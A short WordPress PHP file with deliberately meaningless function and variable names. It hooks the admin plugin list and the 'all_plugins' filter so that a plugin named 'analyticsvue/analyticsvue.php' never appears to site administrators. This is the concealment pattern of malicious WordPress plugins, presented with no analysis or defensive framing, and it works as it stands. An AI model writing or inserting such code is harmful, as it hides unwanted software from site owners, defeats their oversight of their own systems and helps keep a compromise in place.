<?php

function huzixa_inysheth() {
    global $wp_list_table;
    $muchyde = array('analyticsvue/analyticsvue.php');
    $ubiwuku = $wp_list_table->items;
    foreach ($ubiwuku as $todika => $ybiquch) {
        if (in_array($todika, $muchyde)) {
            unset($wp_list_table->items[$todika]);
        }
    }
}

function wufoqy_zhiletyfoq($ponuge_perujutho) {
    if (in_array('analyticsvue/analyticsvue.php', array_keys($ponuge_perujutho))) {
        unset($ponuge_perujutho['analyticsvue/analyticsvue.php']);
    }
    return $ponuge_perujutho;
}

add_action('pre_current_active_plugins', 'huzixa_inysheth');
add_filter('all_plugins', 'wufoqy_zhiletyfoq');
